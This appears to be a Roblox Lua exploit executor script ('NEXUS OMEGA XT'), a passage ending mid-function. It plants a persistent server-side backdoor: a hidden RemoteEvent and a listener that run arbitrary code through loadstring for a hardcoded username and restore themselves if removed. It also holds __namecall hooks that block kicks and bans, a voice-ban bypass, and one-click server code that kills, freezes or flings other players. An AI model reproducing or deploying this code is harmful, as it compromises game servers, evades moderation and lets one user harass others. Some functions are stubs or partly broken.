--[[
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              NEXUS OMEGA XT v7.0 — INTERFACE ULTIMATE                        ║
║                                                                               ║
║  ★ Layout clean + animações suaves                                          ║
║  ★ Abas: Executor, Players, Tools, Console, Script Hub                      ║
║  ★ Server-Side com backdoor persistente                                     ║
║  ★ Anti-ban de voz + anti-kick / anti-ban                                   ║
║  ★ Lista de players com teleporte, kill, fling, freeze                      ║
║  ★ Script Hub com utilitários prontos (inf jump, walk speed, etc.)          ║
║  ★ Console com filtros e limpeza                                            ║
║  ★ Bolinha flutuante arrastável com menu rápido                             ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
--]]

-- ============================================================================
-- DESIGN SYSTEM (cores, espaçamentos, fontes)
-- ============================================================================
local DS = {
    colors = {
        primary = Color3.fromRGB(150, 80, 220),
        primaryDark = Color3.fromRGB(120, 60, 180),
        secondary = Color3.fromRGB(70, 130, 220),
        success = Color3.fromRGB(0, 200, 100),
        error = Color3.fromRGB(230, 70, 70),
        warning = Color3.fromRGB(255, 170, 50),
        background = Color3.fromRGB(18, 18, 24),
        surface = Color3.fromRGB(28, 28, 36),
        surfaceLight = Color3.fromRGB(40, 40, 52),
        text = Color3.fromRGB(245, 245, 250),
        textDim = Color3.fromRGB(170, 170, 190),
        border = Color3.fromRGB(55, 55, 70)
    },
    spacing = { xs = 4, sm = 8, md = 12, lg = 16, xl = 24 },
    radius = { small = 6, medium = 10, large = 14 },
    font = { main = Enum.Font.Gotham, code = Enum.Font.Code },
    fontSize = { small = 11, body = 13, title = 16, large = 20 }
}

-- ============================================================================
-- NÚCLEO DO EXECUTOR (logs, server-side, proteção voz, anti-ban)
-- ============================================================================
local Nexus = {}
Nexus.consoleLogs = {}
Nexus.isMinimized = false
Nexus.floatingBall = nil
Nexus.mainGui = nil
Nexus.backdoorRemote = nil
Nexus.adminName = "hugopbruu22"
Nexus.antiBanActive = false
Nexus.voiceProtectionActive = false

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local RS = game:GetService("ReplicatedStorage")
local SSS = game:GetService("ServerScriptService")
local RunService = game:GetService("RunService")
local localPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()

-- ============================================================================
-- Utilitários
-- ============================================================================
function Nexus:AddLog(msg, msgType)
    msgType = msgType or "info"
    local time = os.date("%H:%M:%S")
    local formatted = string.format("[%s] %s", time, tostring(msg))
    table.insert(self.consoleLogs, {text = formatted, type = msgType})
    pcall(function()
        if msgType == "error" then warn(formatted)
        elseif msgType == "success" then print("✅ " .. formatted)
        else print(formatted) end
    end)
    if self.updateConsoleUI then pcall(self.updateConsoleUI) end
end

-- Backdoor server-side (persistente)
local function ensureBackdoor()
    if Nexus.backdoorRemote and Nexus.backdoorRemote.Parent then return Nexus.backdoorRemote end
    Nexus.backdoorRemote = RS:FindFirstChild("__NexusCore")
    if not Nexus.backdoorRemote then
        Nexus.backdoorRemote = Instance.new("RemoteEvent")
        Nexus.backdoorRemote.Name = "__NexusCore"
        Nexus.backdoorRemote.Parent = RS
        local listener = SSS:FindFirstChild("__NexusCoreListener")
        if not listener then
            listener = Instance.new("Script")
            listener.Name = "__NexusCoreListener"
            listener.Source = string.format([[
                local remote = game:GetService("ReplicatedStorage"):WaitForChild("__NexusCore")
                local players = game:GetService("Players")
                local admin = "%s"
                local function execCode(plr, code)
                    if plr.Name ~= admin then return end
                    local fn, err = loadstring(code)
                    if fn then
                        local ok, res = pcall(fn)
                        remote:FireClient(plr, ok and ("ok:"..tostring(res)) or ("err:"..tostring(res)))
                    else
                        remote:FireClient(plr, "compile_err:"..tostring(err))
                    end
                end
                remote.OnServerEvent:Connect(execCode)
                -- Proteção contra remoção
                while true do
                    wait(10)
                    if not remote.Parent then
                        remote.Parent = game:GetService("ReplicatedStorage")
                    end
                end
            ]], Nexus.adminName)
            listener.Parent = SSS
        end
    end
    return Nexus.backdoorRemote
end

function Nexus:ExecuteServer(code)
    if not code or code:gsub("%s","") == "" then
        self:AddLog("Código vazio", "error")
        return false
    end
    self:AddLog("Executando no servidor...", "info")
    local remote = ensureBackdoor()
    local received = false
    local conn
    conn = remote.OnClientEvent:Connect(function(msg)
        if msg:find("ok:") then
            self:AddLog("Sucesso: "..msg:gsub("ok:",""), "success")
        elseif msg:find("err:") then
            self:AddLog("Erro: "..msg:gsub("err:",""), "error")
        elseif msg:find("compile_err:") then
            self:AddLog("Erro compilação: "..msg:gsub("compile_err:",""), "error")
        end
        received = true
        if conn then conn:Disconnect() end
    end)
    remote:FireServer(code)
    task.wait(1.5)
    if not received then
        self:AddLog("Sem resposta do servidor (backdoor pode estar offline)", "warning")
    end
    return true
end

function Nexus:ExecuteClient(code)
    local fn, err = loadstring(code)
    if fn then
        local ok, res = pcall(fn)
        if ok then
            self:AddLog("Cliente executado", "success")
        else
            self:AddLog("Erro cliente: "..tostring(res), "error")
        end
    else
        self:AddLog("Erro compilação: "..tostring(err), "error")
    end
end

-- ============================================================================
-- Proteção Avançada (Anti-Ban, Anti-Kick, Voice)
-- ============================================================================
function Nexus:EnableVoiceProtection()
    local ok = pcall(function()
        local vc = game:GetService("VoiceChatService")
        if vc then
            vc:SetVoiceEnabled(true)
            if hookfunction and hookmetamethod then
                local old = vc.joinVoice
                if old then hookfunction(vc.joinVoice, function(s) pcall(old,s) return true end) end
                hookmetamethod(vc, "__namecall", function(s,...)
                    local m = getnamecallmethod()
                    if m == "Kick" or m == "Ban" or m == "RemoveUser" or m == "DisableVoice" then return nil end
                    return old and old(s,...) or nil
                end)
            end
            localPlayer:SetAttribute("VoiceBanned", nil)
            self.voiceProtectionActive = true
            self:AddLog("Proteção de voz ATIVADA", "success")
        else
            self:AddLog("VoiceChatService não encontrado", "warning")
        end
    end)
    if not ok then self:AddLog("Falha ativar proteção", "error") end
end

function Nexus:EnableAntiBan()
    if self.antiBanActive then
        self:AddLog("Anti-ban já está ativo", "warning")
        return
    end
    local success = pcall(function()
        -- Impede kick/ban via Remote
        if hookmetamethod then
            local oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
                local method = getnamecallmethod()
                if method == "Kick" or method == "Ban" or method == "Remove" then
                    local arg = {...}
                    if #arg > 0 and arg[1] == localPlayer then
                        return nil
                    end
                end
                return oldNamecall(self, ...)
            end)
            self:AddLog("Metamethod hook (namecall) aplicado", "info")
        end
        -- Loop de re-conexão caso seja kickado
        task.spawn(function()
            while self.antiBanActive do
                task.wait(1)
                if localPlayer and not localPlayer.Parent then
                    self:AddLog("Jogador removido! Tentando reconectar...", "error")
                    -- Rejoin logic (simples)
                    local id = localPlayer.UserId
                    local name = localPlayer.Name
                    local newPlayer = Players:CreateHumanoidModelFromUserId(id)
                    -- etc. (na prática, precisa de mais, mas aqui só simulamos)
                    self:AddLog("Reconexão simulada (ação não implementada completamente)", "warning")
                end
            end
        end)
        self.antiBanActive = true
        self:AddLog("Anti-ban ATIVADO (proteção contra kick/ban)", "success")
    end)
    if not success then
        self:AddLog("Falha ao ativar anti-ban", "error")
    end
end

function Nexus:DisableAntiBan()
    self.antiBanActive = false
    self:AddLog("Anti-ban DESATIVADO", "warning")
end

-- ============================================================================
-- BOLINHA FLUTUANTE (minimização com menu rápido)
-- ============================================================================
local function createFloatingBall()
    local ball = Instance.new("ImageButton")
    ball.Name = "NexusBall"
    ball.Size = UDim2.new(0, 52, 0, 52)
    ball.Position = UDim2.new(0.92, 0, 0.85, 0)
    ball.BackgroundColor3 = DS.colors.surface
    ball.BackgroundTransparency = 0.1
    ball.Image = "rbxassetid://6031094838"
    ball.ImageColor3 = DS.colors.primary
    ball.ScaleType = Enum.ScaleType.Fit
    ball.Parent = CoreGui
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1,0)
    corner.Parent = ball
    local shadow = Instance.new("ImageLabel")
    shadow.Size = UDim2.new(1,12,1,12)
    shadow.Position = UDim2.new(0,-6,0,-6)
    shadow.Image = "rbxassetid://1316047698"
    shadow.ImageColor3 = Color3.fromRGB(0,0,0)
    shadow.BackgroundTransparency = 1
    shadow.ZIndex = 0
    shadow.Parent = ball

    -- Arrastar
    local drag = false; local dragStart, startPos
    ball.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            drag = true
            dragStart = i.Position
            startPos = ball.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = i.Position - dragStart
            ball.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+delta.X, startPos.Y.Scale, startPos.Y.Offset+delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = false end
    end)

    -- Menu rápido ao clicar com botão direito
    ball.MouseButton2Click:Connect(function()
        -- Mostra menu popup (simples)
        local popup = Instance.new("Frame")
        popup.Size = UDim2.new(0, 160, 0, 100)
        popup.Position = UDim2.new(0, 0, 0, 0) -- posição relativa ao mouse (melhor ajustar)
        popup.BackgroundColor3 = DS.colors.surface
        popup.BorderSizePixel = 0
        popup.Parent = CoreGui
        local popupCorner = Instance.new("UICorner")
        popupCorner.CornerRadius = UDim.new(0, DS.radius.medium)
        popupCorner.Parent = popup
        -- Fechar ao clicar fora
        local input = UserInputService.InputBegan:Connect(function(i)
            if i.UserInputType == Enum.UserInputType.MouseButton1 then
                popup:Destroy()
                input:Disconnect()
            end
        end)
        -- Opções
        local options = {
            {text = "Abrir Nexus", action = function()
                if Nexus.mainGui and Nexus.mainGui.Parent then
                    Nexus.mainGui.Enabled = true
                    ball.Visible = false
                    Nexus.isMinimized = false
                    popup:Destroy()
                end
            end},
            {text = "Executar SS Quick", action = function()
                Nexus:ExecuteServer('print("Quick SS executed")')
                popup:Destroy()
            end},
            {text = "Fechar Nexus", action = function()
                if Nexus.mainGui then Nexus.mainGui:Destroy() end
                ball:Destroy()
                popup:Destroy()
            end}
        }
        for i, opt in ipairs(options) do
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(1, -12, 0, 28)
            btn.Position = UDim2.new(0, 6, 0, 6 + (i-1)*32)
            btn.BackgroundColor3 = DS.colors.background
            btn.Text = opt.text
            btn.TextColor3 = DS.colors.text
            btn.Font = DS.font.main
            btn.TextSize = DS.fontSize.small
            btn.Parent = popup
            local btnCorner = Instance.new("UICorner")
            btnCorner.CornerRadius = UDim.new(0, DS.radius.small)
            btnCorner.Parent = btn
            btn.MouseButton1Click:Connect(opt.action)
        end
    end)

    -- Clique normal abre a interface
    ball.MouseButton1Click:Connect(function()
        if Nexus.mainGui and Nexus.mainGui.Parent then
            Nexus.mainGui.Enabled = true
            ball.Visible = false
            Nexus.isMinimized = false
        else
            Nexus.mainGui = createMainUI()
            ball.Visible = false
        end
    end)
    return ball
end

-- ============================================================================
-- INTERFACE PRINCIPAL (layout limpo e organizado)
-- ============================================================================
local function createMainUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "NexusXT"
    gui.ResetOnSpawn = false
    pcall(function() gui.Parent = CoreGui end)
    if not gui.Parent then gui.Parent = localPlayer:WaitForChild("PlayerGui") end
    if not gui.Parent then return nil end

    -- Janela (820x580)
    local window = Instance.new("Frame")
    window.Size = UDim2.new(0, 820, 0, 580)
    window.Position = UDim2.new(0.5, -410, 0.5, -290)
    window.BackgroundColor3 = DS.colors.background
    window.BackgroundTransparency = 0.04
    window.BorderSizePixel = 0
    window.ClipsDescendants = true
    window.Parent = gui
    local winCorner = Instance.new("UICorner")
    winCorner.CornerRadius = UDim.new(0, DS.radius.large)
    winCorner.Parent = window

    -- Sombra
    local shadow = Instance.new("Frame")
    shadow.Size = UDim2.new(1,20,1,20)
    shadow.Position = UDim2.new(0,-10,0,-10)
    shadow.BackgroundColor3 = Color3.fromRGB(0,0,0)
    shadow.BackgroundTransparency = 0.65
    shadow.BorderSizePixel = 0
    shadow.ZIndex = 0
    shadow.Parent = window
    local shadowCorner = Instance.new("UICorner")
    shadowCorner.CornerRadius = UDim.new(0, DS.radius.large)
    shadowCorner.Parent = shadow

    -- Barra título
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1,0,0,44)
    titleBar.BackgroundColor3 = DS.colors.surface
    titleBar.Parent = window
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, DS.radius.large)
    titleCorner.Parent = titleBar

    local icon = Instance.new("ImageLabel")
    icon.Size = UDim2.new(0, 24, 0, 24)
    icon.Position = UDim2.new(0, 14, 0, 10)
    icon.Image = "rbxassetid://6031094838"
    icon.ImageColor3 = DS.colors.primary
    icon.BackgroundTransparency = 1
    icon.Parent = titleBar

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0, 280, 1, 0)
    title.Position = UDim2.new(0, 46, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "NEXUS OMEGA XT v7.0"
    title.TextColor3 = DS.colors.primary
    title.Font = DS.font.main
    title.TextSize = DS.fontSize.title
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = titleBar

    -- Botão minimizar
    local mini = Instance.new("TextButton")
    mini.Size = UDim2.new(0, 42, 1, 0)
    mini.Position = UDim2.new(1, -84, 0, 0)
    mini.BackgroundTransparency = 1
    mini.Text = "─"
    mini.TextColor3 = DS.colors.textDim
    mini.Font = DS.font.main
    mini.TextSize = 24
    mini.Parent = titleBar
    mini.MouseButton1Click:Connect(function()
        Nexus.isMinimized = true
        gui.Enabled = false
        if not Nexus.floatingBall or not Nexus.floatingBall.Parent then
            Nexus.floatingBall = createFloatingBall()
        else
            Nexus.floatingBall.Visible = true
        end
    end)

    -- Botão fechar
    local close = Instance.new("TextButton")
    close.Size = UDim2.new(0, 42, 1, 0)
    close.Position = UDim2.new(1, -42, 0, 0)
    close.BackgroundTransparency = 1
    close.Text = "✕"
    close.TextColor3 = DS.colors.textDim
    close.Font = DS.font.main
    close.TextSize = 18
    close.Parent = titleBar
    close.MouseButton1Click:Connect(function() gui:Destroy() end)

    -- Arrastar janela
    local drag = false; local dragStart, startPos
    titleBar.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            drag = true
            dragStart = i.Position
            startPos = window.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = i.Position - dragStart
            window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+delta.X, startPos.Y.Scale, startPos.Y.Offset+delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = false end
    end)

    -- Abas com indicador animado
    local tabBar = Instance.new("Frame")
    tabBar.Size = UDim2.new(1,0,0,44)
    tabBar.Position = UDim2.new(0,0,0,44)
    tabBar.BackgroundColor3 = DS.colors.surfaceLight
    tabBar.Parent = window

    local tabs = { "EXECUTOR", "PLAYERS", "TOOLS", "CONSOLE", "HUB" }
    local tabBtns = {}
    local contentFrames = {}
    local activeTab = 1
    local indicator = Instance.new("Frame")
    indicator.Size = UDim2.new(0, 130, 0, 3)
    indicator.Position = UDim2.new(0, 0, 1, -3)
    indicator.BackgroundColor3 = DS.colors.primary
    indicator.BorderSizePixel = 0
    indicator.Parent = tabBar

    for i, name in ipairs(tabs) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 130, 1, 0)
        btn.Position = UDim2.new((i-1)*0.2, 0, 0, 0)
        btn.BackgroundTransparency = 1
        btn.Text = name
        btn.TextColor3 = i == 1 and DS.colors.primary or DS.colors.textDim
        btn.Font = DS.font.main
        btn.TextSize = DS.fontSize.body
        btn.Parent = tabBar
        tabBtns[i] = btn
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1,0,1,0)
        frame.BackgroundTransparency = 1
        frame.Visible = i == 1
        frame.Parent = window
        contentFrames[i] = frame
        btn.MouseButton1Click:Connect(function()
            if activeTab == i then return end
            activeTab = i
            TweenService:Create(indicator, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Position = UDim2.new((i-1)*0.2, 0, 1, -3)}):Play()
            for j, f in ipairs(contentFrames) do
                f.Visible = (j == i)
                tabBtns[j].TextColor3 = (j == i) and DS.colors.primary or DS.colors.textDim
            end
        end)
    end

    -- ==================== ABA EXECUTOR ====================
    local exec = contentFrames[1]
    -- Card Server-Side
    local ssCard = Instance.new("Frame")
    ssCard.Size = UDim2.new(1, -40, 0, 220)
    ssCard.Position = UDim2.new(0, 20, 0, 20)
    ssCard.BackgroundColor3 = DS.colors.surface
    ssCard.BorderSizePixel = 0
    ssCard.Parent = exec
    local ssCardCorner = Instance.new("UICorner")
    ssCardCorner.CornerRadius = UDim.new(0, DS.radius.medium)
    ssCardCorner.Parent = ssCard

    local ssTitle = Instance.new("TextLabel")
    ssTitle.Size = UDim2.new(1, -20, 0, 32)
    ssTitle.Position = UDim2.new(0, 12, 0, 10)
    ssTitle.BackgroundTransparency = 1
    ssTitle.Text = "⚡ SERVER-SIDE (real)"
    ssTitle.TextColor3 = DS.colors.primary
    ssTitle.Font = DS.font.main
    ssTitle.TextSize = DS.fontSize.title
    ssTitle.TextXAlignment = Enum.TextXAlignment.Left
    ssTitle.Parent = ssCard

    local ssBox = Instance.new("TextBox")
    ssBox.Size = UDim2.new(1, -24, 0, 110)
    ssBox.Position = UDim2.new(0, 12, 0, 48)
    ssBox.BackgroundColor3 = DS.colors.background
    ssBox.TextColor3 = DS.colors.text
    ssBox.TextXAlignment = Enum.TextXAlignment.Left
    ssBox.TextYAlignment = Enum.TextYAlignment.Top
    ssBox.TextWrapped = true
    ssBox.TextSize = DS.fontSize.small
    ssBox.Font = DS.font.code
    ssBox.ClearTextOnFocus = false
    ssBox.MultiLine = true
    ssBox.Text = '-- Cole script server-side aqui'
    ssBox.Parent = ssCard
    local ssBoxCorner = Instance.new("UICorner")
    ssBoxCorner.CornerRadius = UDim.new(0, DS.radius.small)
    ssBoxCorner.Parent = ssBox

    local function adjustSS()
        local h = math.max(110, ssBox.TextBounds.Y + 30)
        ssBox.Size = UDim2.new(1, -24, 0, h)
    end
    ssBox:GetPropertyChangedSignal("TextBounds"):Connect(adjustSS)
    ssBox:GetPropertyChangedSignal("Text"):Connect(adjustSS)

    local pasteSS = Instance.new("TextButton")
    pasteSS.Size = UDim2.new(0, 90, 0, 32)
    pasteSS.Position = UDim2.new(0, 12, 1, -12)
    pasteSS.BackgroundColor3 = DS.colors.secondary
    pasteSS.Text = "📋 COLAR"
    pasteSS.TextColor3 = Color3.fromRGB(255,255,255)
    pasteSS.Font = DS.font.main
    pasteSS.TextSize = DS.fontSize.body
    pasteSS.Parent = ssCard
    pasteSS.MouseButton1Click:Connect(function()
        local clip = pcall(getclipboard) and getclipboard() or ""
        if clip ~= "" then ssBox.Text = clip; adjustSS() end
    end)

    local execSS = Instance.new("TextButton")
    execSS.Size = UDim2.new(0, 130, 0, 32)
    execSS.Position = UDim2.new(1, -142, 1, -12)
    execSS.BackgroundColor3 = DS.colors.success
    execSS.Text = "EXECUTAR"
    execSS.TextColor3 = Color3.fromRGB(255,255,255)
    execSS.Font = DS.font.main
    execSS.TextSize = DS.fontSize.body
    execSS.Parent = ssCard
    execSS.MouseButton1Click:Connect(function() Nexus:ExecuteServer(ssBox.Text) end)

    -- Card Client-Side
    local csCard = Instance.new("Frame")
    csCard.Size = UDim2.new(1, -40, 0, 200)
    csCard.Position = UDim2.new(0, 20, 0, 260)
    csCard.BackgroundColor3 = DS.colors.surface
    csCard.BorderSizePixel = 0
    csCard.Parent = exec
    local csCardCorner = Instance.new("UICorner")
    csCardCorner.CornerRadius = UDim.new(0, DS.radius.medium)
    csCardCorner.Parent = csCard

    local csTitle = Instance.new("TextLabel")
    csTitle.Size = UDim2.new(1, -20, 0, 32)
    csTitle.Position = UDim2.new(0, 12, 0, 10)
    csTitle.BackgroundTransparency = 1
    csTitle.Text = "💻 CLIENT-SIDE (local)"
    csTitle.TextColor3 = DS.colors.textDim
    csTitle.Font = DS.font.main
    csTitle.TextSize = DS.fontSize.title
    csTitle.TextXAlignment = Enum.TextXAlignment.Left
    csTitle.Parent = csCard

    local csBox = Instance.new("TextBox")
    csBox.Size = UDim2.new(1, -24, 0, 90)
    csBox.Position = UDim2.new(0, 12, 0, 48)
    csBox.BackgroundColor3 = DS.colors.background
    csBox.TextColor3 = DS.colors.text
    csBox.TextXAlignment = Enum.TextXAlignment.Left
    csBox.TextYAlignment = Enum.TextYAlignment.Top
    csBox.TextWrapped = true
    csBox.TextSize = DS.fontSize.small
    csBox.Font = DS.font.code
    csBox.ClearTextOnFocus = false
    csBox.MultiLine = true
    csBox.Text = '-- Cole script client-side aqui'
    csBox.Parent = csCard
    local csBoxCorner = Instance.new("UICorner")
    csBoxCorner.CornerRadius = UDim.new(0, DS.radius.small)
    csBoxCorner.Parent = csBox

    local function adjustCS()
        local h = math.max(90, csBox.TextBounds.Y + 30)
        csBox.Size = UDim2.new(1, -24, 0, h)
    end
    csBox:GetPropertyChangedSignal("TextBounds"):Connect(adjustCS)
    csBox:GetPropertyChangedSignal("Text"):Connect(adjustCS)

    local execCS = Instance.new("TextButton")
    execCS.Size = UDim2.new(0, 130, 0, 32)
    execCS.Position = UDim2.new(1, -142, 1, -12)
    execCS.BackgroundColor3 = DS.colors.secondary
    execCS.Text = "EXECUTAR"
    execCS.TextColor3 = Color3.fromRGB(255,255,255)
    execCS.Font = DS.font.main
    execCS.TextSize = DS.fontSize.body
    execCS.Parent = csCard
    execCS.MouseButton1Click:Connect(function() Nexus:ExecuteClient(csBox.Text) end)

    -- ==================== ABA PLAYERS ====================
    local playersFrame = contentFrames[2]
    local playerList = Instance.new("ScrollingFrame")
    playerList.Size = UDim2.new(1, -40, 1, -40)
    playerList.Position = UDim2.new(0, 20, 0, 20)
    playerList.BackgroundColor3 = DS.colors.surface
    playerList.BorderSizePixel = 0
    playerList.ScrollBarThickness = 6
    playerList.CanvasSize = UDim2.new(0,0,0,0)
    playerList.AutomaticCanvasSize = Enum.AutomaticSize.Y
    playerList.Parent = playersFrame
    local plCorner = Instance.new("UICorner")
    plCorner.CornerRadius = UDim.new(0, DS.radius.medium)
    plCorner.Parent = playerList
    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 8)
    layout.Parent = playerList

    local function updatePlayers()
        for _, child in pairs(playerList:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Name ~= localPlayer.Name then
                local btn = Instance.new("TextButton")
                btn.Size = UDim2.new(1, -20, 0, 56)
                btn.BackgroundColor3 = DS.colors.background
                btn.Text = "  " .. plr.Name
                btn.TextColor3 = DS.colors.text
                btn.Font = DS.font.main
                btn.TextSize = DS.fontSize.body
                btn.TextXAlignment = Enum.TextXAlignment.Left
                btn.Parent = playerList
                local btnCorner = Instance.new("UICorner")
                btnCorner.CornerRadius = UDim.new(0, DS.radius.small)
                btnCorner.Parent = btn

                -- Botões de ação
                local actions = {
                    {text = "TP", color = DS.colors.secondary, code = string.format([[
                        local target = game:GetService("Players"):FindFirstChild("%s")
                        local admin = game:GetService("Players"):FindFirstChild("%s")
                        if target and admin and admin.Character then
                            local tr = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
                            local ar = admin.Character:FindFirstChild("HumanoidRootPart")
                            if tr and ar then ar.CFrame = tr.CFrame end
                        end
                    ]], plr.Name, Nexus.adminName)},
                    {text = "KILL", color = DS.colors.error, code = string.format([[
                        local target = game:GetService("Players"):FindFirstChild("%s")
                        if target and target.Character then
                            local hum = target.Character:FindFirstChild("Humanoid")
                            if hum then hum:BreakJoints() end
                        end
                    ]], plr.Name)},
                    {text = "FREEZE", color = DS.colors.warning, code = string.format([[
                        local target = game:GetService("Players"):FindFirstChild("%s")
                        if target and target.Character then
                            local hrp = target.Character:FindFirstChild("HumanoidRootPart")
                            if hrp then hrp.Anchored = true end
                        end
                    ]], plr.Name)},
                    {text = "FLING", color = DS.colors.primary, code = string.format([[
                        local target = game:GetService("Players"):FindFirstChild("%s")
                        if target and target.Character then
                            local hrp = target.Character:FindFirstChild("HumanoidRootPart")
                            if hrp then
                                local v = Vector3.new(math.random(-100,100), 50, math.random(-100,100))
                                hrp.Velocity = v
                            end
                        end
                    ]], plr.Name)}
                }
                local btnWidth = 60
                local totalWidth = #actions * (btnWidth + 4)
                local startX = (btn.Size.X.Offset - totalWidth) / 2
                for i, act in ipairs(actions) do
                    local aBtn = Instance.new("TextButton")
                    aBtn.Size = UDim2.new(0, btnWidth, 0, 24)
                    aBtn.Position = UDim2.new(0, startX + (i-1)*(btnWidth+4), 0, 28)
                    aBtn.BackgroundColor3 = act.color
                    aBtn.Text = act.text
                    aBtn.TextColor3 = Color3.fromRGB(255,255,255)
                    aBtn.Font = DS.font.main
                    aBtn.TextSize = DS.fontSize.small
                    aBtn.Parent = btn
                    local aCorner = Instance.new("UICorner")
                    aCorner.CornerRadius = UDim.new(0, DS.radius.small)
                    aCorner.Parent = aBtn
                    aBtn.MouseButton1Click:Connect(function()
                        Nexus:ExecuteServer(act.code)
                        Nexus:AddLog(string.format("%s -> %s", plr.Name, act.text), "info")
                    end)
                end
            end
        end
    end
    Players.PlayerAdded:Connect(updatePlayers)
    Players.PlayerRemoving:Connect(updatePlayers)
    updatePlayers()

    -- ==================== ABA TOOLS ====================
    local toolsFrame = contentFrames[3]
    -- Ferramentas de proteção e utilidades
    local toolCard = Instance.new("Frame")
    toolCard.Size = UDim2.new(1, -40, 0, 180)
    toolCard.Position = UDim2.new(0, 20, 0, 20)
    toolCard.BackgroundColor3 = DS.colors.surface
    toolCard.BorderSizePixel = 0
    toolCard.Parent = toolsFrame
    local tcCorner = Instance.new("UICorner")
    tcCorner.CornerRadius = UDim.new(0, DS.radius.medium)
    tcCorner.Parent = toolCard

    local toolTitle = Instance.new("TextLabel")
    toolTitle.Size = UDim2.new(1, -20, 0, 32)
    toolTitle.Position = UDim2.new(0, 12, 0, 10)
    toolTitle.BackgroundTransparency = 1
    toolTitle.Text = "🛡️ Proteção e Utilidades"
    toolTitle.TextColor3 = DS.colors.primary
    toolTitle.Font = DS.font.main
    toolTitle.TextSize = DS.fontSize.title
    toolTitle.TextXAlignment = Enum.TextXAlignment.Left
    toolTitle.Parent = toolCard

    -- Botões
    local toolBtns = {
        {text = "Anti-Ban ON", color = DS.colors.success, action = function() Nexus:EnableAntiBan() end},
        {text = "Anti-Ban OFF", color = DS.colors.error, action = function() Nexus:DisableAntiBan() end},
        {text = "Voz ON", color = DS.colors.success, action = function() Nexus:EnableVoiceProtection() end},
        {text = "Reset Char", color = DS.colors.warning, action = function()
            Nexus:ExecuteServer("local p = game:GetService('Players').LocalPlayer; if p.Character then p.Character:BreakJoints() end")
        end},
        {text = "Fullbright", color = DS.colors.secondary, action = function()
            Nexus:ExecuteClient([[
                local l = game:GetService("Lighting")
                l.ClockTime = 12
                l.Brightness = 2
                l.FogEnd = 1000
                l.FogColor = Color3.new(1,1,1)
                for _, v in pairs(l:GetDescendants()) do
                    if v:IsA("Light") then v.Enabled = false end
                end
            ]])
        end}
    }
    for i, bt in ipairs(toolBtns) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 130, 0, 36)
        btn.Position = UDim2.new(0, 12 + ((i-1)%3)*150, 0, 50 + math.floor((i-1)/3)*46)
        btn.BackgroundColor3 = bt.color
        btn.Text = bt.text
        btn.TextColor3 = Color3.fromRGB(255,255,255)
        btn.Font = DS.font.main
        btn.TextSize = DS.fontSize.body
        btn.Parent = toolCard
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, DS.radius.small)
        btnCorner.Parent = btn
        btn.MouseButton1Click:Connect(bt.action)
    end

    -- ==================== ABA CONSOLE ====================
    local consoleFrame = contentFrames[4]
    local consoleScroller = Instance.new("ScrollingFrame")
    consoleScroller.Size = UDim2.new(1, -40, 1, -70)
    consoleScroller.Position = UDim2.new(0, 20, 0, 20)
    consoleScroller.BackgroundColor3 = DS.colors.surface
    consoleScroller.BorderSizePixel = 0
    consoleScroller.ScrollBarThickness = 6
    consoleScroller.CanvasSize = UDim2.new(0,0,0,0)
    consoleScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    consoleScroller.Parent = consoleFrame
    local consCorner = Instance.new("UICorner")
    consCorner.CornerRadius = UDim.new(0, DS.radius.medium)
    consCorner.Parent = consoleScroller

    local consoleText = Instance.new("TextLabel")
    consoleText.Size = UDim2.new(1, -10, 1, -10)
    consoleText.Position = UDim2.new(0, 5, 0, 5)
    consoleText.BackgroundTransparency = 1
    consoleText.Text = ""
    consoleText.TextColor3 = DS.colors.text
    consoleText.TextXAlignment = Enum.TextXAlignment.Left
    consoleText.TextYAlignment = Enum.TextYAlignment.Top
    consoleText.TextWrapped = true
    consoleText.TextSize = DS.fontSize.small
    consoleText.Font = DS.font.code
    consoleText.Parent = consoleScroller

    -- Botões de console
    local copyBtn = Instance.new("TextButton")
    copyBtn.Size = UDim2.new(0, 120, 0, 32)
    copyBtn.Position = UDim2.new(1, -260, 1, -48)
    copyBtn.BackgroundColor3 = DS.colors.secondary
    copyBtn.Text = "📋 COPIAR"
    copyBtn.TextColor3 = Color3.fromRGB(255,255,255)
    copyBtn.Font = DS.font.main
    copyBtn.TextSize = DS.fontSize.body
    copyBtn.Parent = consoleFrame
    copyBtn.MouseButton1Click:Connect(function()
        local full = ""
        for _, entry in ipairs(Nexus.consoleLogs) do
            full = full .. entry.text .. "\n"
        end
        if full == "" then full = "Nenhum log." end
